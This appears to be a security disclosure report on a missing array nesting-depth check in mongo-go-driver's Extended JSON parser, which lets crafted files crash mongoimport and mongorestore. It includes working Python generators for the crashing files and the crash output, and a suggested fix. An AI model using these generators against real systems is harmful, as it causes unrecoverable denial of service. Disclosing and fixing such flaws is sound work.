# Title

`bson.UnmarshalExtJSON` nesting-depth limit protects nested objects but not nested arrays — unauthenticated stack-overflow crash from a small JSON file, reachable via `mongoimport` (Database Tools)

## Summary

The Go driver's Extended JSON parser (`go.mongodb.org/mongo-driver/v2/bson`) enforces a
`maxNestingDepth = 200` limit specifically to prevent unbounded-recursion crashes on maliciously
nested input. The protection is real and works correctly for nested **objects** — a JSON document
nested 201 levels deep with `{...}` is cleanly rejected with `"invalid JSON input; nesting too
deep (201 levels)"`. But the identical protection is **never applied to nested arrays**: the
depth counter is only incremented (and checked) in the `jttBeginObject` case of the parser's
token-handling switch; the `jttBeginArray` case pushes the array parsing mode but never touches
`ejp.depth` at all. A JSON document consisting of deeply nested arrays sails straight through with
zero depth checking, and the subsequent reflective decode into an `interface{}`-typed value
(exactly what `bson.UnmarshalExtJSON(data, false, &doc)` does when `doc` is a `bson.M`/generic
map, which is exactly how `mongoimport --type=json` uses it) recurses once per array-nesting
level with no depth limit of its own either, until the goroutine's 1GB stack is exhausted and the
Go runtime terminates the process with an unrecoverable `fatal error: stack overflow` — a crash
that bypasses `recover()` entirely (this is not a regular panic).

A 4MB text file containing 2,000,000 levels of `[` before a single scalar value is sufficient. In
practice, far smaller files would suffice — 2,000,000 was simply what I tested; the real ceiling
is set by available stack space, not file size, since each nesting level costs one byte of input
but one full (large) stack frame across at least two mutually-recursive codec functions.

## Weakness

CWE-674 (Uncontrolled Recursion) / CWE-20 (Improper Input Validation — an existing validation
control that covers one syntactic case of the same construct but not its sibling).

## Component / Version

- **Root cause repository:** `mongodb/mongo-go-driver` (HackerOne scope: **Drivers → Go**)
  - Tag: `v2.7.0`
  - Commit: [`fd0737fcaa0a3ab763ffa4453354ac50420e3c04`](https://github.com/mongodb/mongo-go-driver/commit/fd0737fcaa0a3ab763ffa4453354ac50420e3c04)
- **Concrete reachability demonstrated via:** `mongodb/mongo-tools` (HackerOne scope: **Database
  Tools**), tag `100.18.0`, commit
  [`21a342dfee6468ad9350d156d25086da64dd03b1`](https://github.com/mongodb/mongo-tools/commit/21a342dfee6468ad9350d156d25086da64dd03b1),
  which vendors this exact driver version byte-for-byte (verified directly, diffed clean against
  the driver's own repo at the pinned commit), via **two independent call sites**:
  - `mongoimport --type=json`'s JSON input path
    ([`mongoimport/json.go#L171`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongoimport/json.go#L171))
  - `mongorestore`'s per-collection metadata parsing
    ([`mongorestore/metadata.go#L57`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/metadata.go#L57)),
    triggered by a single malicious `<collection>.metadata.json` file inside **any** dump
    directory restored with `mongorestore --dir` — arguably the more dangerous of the two, since
    it fires during the very first "reading metadata" step of the single most standard way
    anyone restores a MongoDB backup, and needs no special flag (`--type=json` isn't required;
    plain `mongorestore --dir <dump>` is enough).
- This affects any Go application — not just `mongoimport` — that calls
  `bson.UnmarshalExtJSON`/`bson.UnmarshalExtJSONValue` (or anything that routes through the
  driver's Extended-JSON-to-`interface{}` decode path) on untrusted input.

## Root cause, with links to the exact code

`bson/extjson_parser.go`, the token-handling switch in `advanceState`
([lines 546-570](https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/extjson_parser.go#L546-L570)):

```go
switch jt.t {
case jttBeginObject:
    ejp.s = jpsSawBeginObject
    ejp.pushMode(jpmObjectMode)
    ejp.depth++                                  // <-- depth is tracked here

    if ejp.depth > ejp.maxDepth {
        ejp.err = nestingDepthError(jt.p, ejp.depth)   // <-- and enforced here
        ejp.s = jpsInvalidState
    }
case jttEndObject:
    ejp.s = jpsSawEndObject
    ejp.depth--
    ...
case jttBeginArray:
    ejp.s = jpsSawBeginArray
    ejp.pushMode(jpmArrayMode)                   // <-- no ejp.depth++ at all
                                                  // <-- no depth check at all
case jttEndArray:
    ejp.s = jpsSawEndArray
    ...
```

`maxNestingDepth` is declared at
[`extjson_parser.go:18`](https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/extjson_parser.go#L18):
```go
const maxNestingDepth = 200
```

`jttBeginObject` and `jttEndObject` correctly maintain `ejp.depth` symmetrically with the check.
`jttBeginArray`/`jttEndArray` maintain the parser's separate `mode` stack (needed for syntax
validation) but were simply never wired up to the same `depth` counter — a one-sided omission,
not a deliberate design choice (nothing in the surrounding code or comments suggests arrays were
meant to be exempt).

Once the (unbounded) array structure is tokenized, `bson.UnmarshalExtJSON`'s decode-into-value
step recurses through the driver's codec layer once per nesting level with its own, separate lack
of any depth limit — confirmed directly in the crash stack trace as a tight mutually-recursive
cycle:

- [`decodeTypeOrValueWithInfo`](https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/bsoncodec.go#L186-L201) calls `vd.DecodeValue(...)`
- → [`(*sliceCodec).DecodeValue`](https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/slice_codec.go#L160) (handling the array/`bson.A` value)
- → [`decodeDefault`](https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/default_value_decoders.go#L1418), which for each array element calls `decodeTypeOrValueWithInfo` again
- → [`(*emptyInterfaceCodec).decodeType`](https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/empty_interface_codec.go#L99) (the element is `interface{}`-typed) calls `decodeTypeOrValueWithInfo` again, completing the cycle.

None of these four functions carry or check a recursion-depth parameter.

## Steps to Reproduce

Built `mongoimport` from the exact `mongo-tools` `100.18.0` tag source (behavior-identical to the
official Database Tools release binary; vendored driver code verified byte-identical to the real
`mongo-go-driver` v2.7.0 tag).

```python
# Build a 4MB file: 2,000,000 nested JSON arrays wrapped in one object
# (top-level must be an object for mongoimport's per-line JSON reader)
N = 2_000_000
with open('deepnest.json', 'wb') as f:
    f.write(b'{"a":')
    f.write(b'[' * N)
    f.write(b'1')
    f.write(b']' * N)
    f.write(b'}')
```

```
$ mongoimport --port 27017 --db test --collection deepnest --type=json --file deepnest.json
2026-08-30T13:14:23.715+0000  connected to: mongodb://localhost:27777/
2026-08-30T13:14:26.715+0000  [########################] test.deepnest  3.81MB/3.81MB (100.0%)
runtime: goroutine stack exceeds 1000000000-byte limit
runtime: sp=0xddc419a6378 stack=[0xddc419a6000, 0xddc619a6000]
fatal error: stack overflow

goroutine 56 [running]:
...
go.mongodb.org/mongo-driver/v2/bson.(*sliceCodec).DecodeValue(...)
    vendor/go.mongodb.org/mongo-driver/v2/bson/slice_codec.go:160
go.mongodb.org/mongo-driver/v2/bson.decodeTypeOrValueWithInfo(...)
    vendor/go.mongodb.org/mongo-driver/v2/bson/bsoncodec.go:201
go.mongodb.org/mongo-driver/v2/bson.(*emptyInterfaceCodec).decodeType(...)
    vendor/go.mongodb.org/mongo-driver/v2/bson/empty_interface_codec.go:99
go.mongodb.org/mongo-driver/v2/bson.decodeTypeOrValueWithInfo(...)
    vendor/go.mongodb.org/mongo-driver/v2/bson/bsoncodec.go:186
go.mongodb.org/mongo-driver/v2/bson.decodeDefault(...)
    vendor/go.mongodb.org/mongo-driver/v2/bson/default_value_decoders.go:1418
[... this four-frame cycle repeats for the full length of the stack dump ...]
```

**Contrast** — the identical nesting depth using *objects* instead of arrays is correctly and
cleanly rejected, proving the guard exists and works, just not for this sibling case:
```
# Same idea, 250 levels of {"a": ... } instead of arrays:
$ mongoimport --port 27017 --db test --collection objnest --type=json --file objnest250.json
Failed: invalid JSON input; nesting too deep (201 levels) at position 488
0 document(s) imported successfully. 0 document(s) failed to import.
```

**Second, independent reproduction — via `mongorestore` restoring an ordinary dump directory**
(no `--type=json`, no special flags, just the single most standard restore invocation):

```python
# dump/test/deepnest.bson can be empty (0 bytes).
# dump/test/deepnest.metadata.json: the malicious array must sit as a *value inside* the
# "options" object, since Metadata.Options is typed bson.D and its outer value must itself
# be an object -- the array goes one level deeper, at an arbitrary key within it.
N = 2_000_000
with open('dump/test/deepnest.metadata.json', 'wb') as f:
    f.write(b'{"options":{"a":')
    f.write(b'[' * N)
    f.write(b'1')
    f.write(b']' * N)
    f.write(b'}}')
```

```
$ mongorestore --port 27017 --dir dump
2026-08-30T23:55:51.100+0000  preparing collections to restore from
2026-08-30T23:55:51.100+0000  reading metadata for `test.deepnest` from `dump/test/deepnest.metadata.json`
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow
$ echo $?
2
```

The crash fires during the very first "reading metadata" step, before `mongorestore` has
inserted a single document — a single hostile file anywhere in an otherwise-ordinary-looking
dump directory is sufficient to take down the whole restore the moment it's pointed at.

## Authentication Required

**None.** The PoC was run against a target `mongod` with no `--auth` flag (the unauthenticated
default). `mongoimport` does need to establish a connection to *some* reachable `mongod` before
processing begins (confirmed by the `connected to: ...` line preceding the crash), but that is
connectivity, not authentication — this succeeds with zero credentials against an unauthenticated
deployment. The real precondition is getting a victim to run `mongoimport --type=json` (or any Go
application to call `bson.UnmarshalExtJSON` into an `interface{}`/`bson.M`-typed value) on an
attacker-supplied file — a file/supply-chain trust boundary, not an authentication boundary.

## Impact

Any application built on `mongo-go-driver` that parses Extended JSON from an untrusted source has
its process crash unrecoverably from a single, cheap-to-produce, few-megabyte (plausibly much
smaller) input file. Concretely, within `mongo-tools` this is reachable two ways, one of which
needs no special invocation at all: an operator running `mongoimport --type=json` against an
untrusted file, **or** an operator running plain `mongorestore --dir <dump>` — the single most
standard restore command there is — against a dump directory containing one hostile
`.metadata.json` among otherwise-ordinary files. The latter is the more realistic threat: dump
directories are routinely shared, migrated between environments, or sourced from backups whose
full provenance isn't always verified, and the crash fires before a single document is restored.
Because this is a Go **fatal error**
(stack overflow), not a panic, no `recover()` anywhere in the calling application can catch or
mitigate it — the process terminates immediately regardless of any error-handling the embedding
application has in place. This is a clean, deterministic, unauthenticated denial-of-service
against every consumer of this driver function, distinct from ordinary resource-exhaustion
concerns because of how small and cheap the trigger is and because it cannot be caught.

## Suggested Fix

Increment and check `ejp.depth` in the `jttBeginArray` case exactly as is already done for
`jttBeginObject`, and decrement it in `jttEndArray` exactly as `jttEndObject` already does:

```go
case jttBeginArray:
    ejp.s = jpsSawBeginArray
    ejp.pushMode(jpmArrayMode)
    ejp.depth++
    if ejp.depth > ejp.maxDepth {
        ejp.err = nestingDepthError(jt.p, ejp.depth)
        ejp.s = jpsInvalidState
    }
case jttEndArray:
    ejp.s = jpsSawEndArray
    ejp.depth--
    ...
```

This alone would stop the parser from ever tokenizing input deep enough to threaten the codec
layer's own (separately unbounded) recursion, since 200 levels is nowhere near enough to exhaust a
goroutine stack — closing the gap at the parser stage is sufficient without also needing to touch
the codec layer.

## Supporting Material

- Companion reports from the same audit pass (separate findings, `mongo-tools` repository):
  `security-research/mongo-tools/mongofiles-get-path-traversal-bypass-2026-08-30/`,
  `security-research/mongo-tools/mongorestore-oplog-replay-panic-2026-08-30/`
- Vulnerable code (missing array-depth tracking): https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/extjson_parser.go#L546-L570
- Working protection for objects, for direct comparison: https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/extjson_parser.go#L547-L553
- `maxNestingDepth` declaration: https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/extjson_parser.go#L18
- Codec-layer recursive cycle (secondary, independent lack of depth limiting):
  - https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/bsoncodec.go#L186-L201
  - https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/slice_codec.go#L160
  - https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/empty_interface_codec.go#L99
  - https://github.com/mongodb/mongo-go-driver/blob/fd0737fcaa0a3ab763ffa4453354ac50420e3c04/bson/default_value_decoders.go#L1418
- Reachability entry points in `mongo-tools`:
  - `mongoimport`: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongoimport/json.go#L171
  - `mongorestore`: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongorestore/metadata.go#L57
- Vendored driver copy in `mongo-tools`, verified byte-identical to the driver repo at the pinned commit: `vendor/go.mongodb.org/mongo-driver/v2/bson/` (go.mod pins `go.mongodb.org/mongo-driver/v2 v2.7.0`)
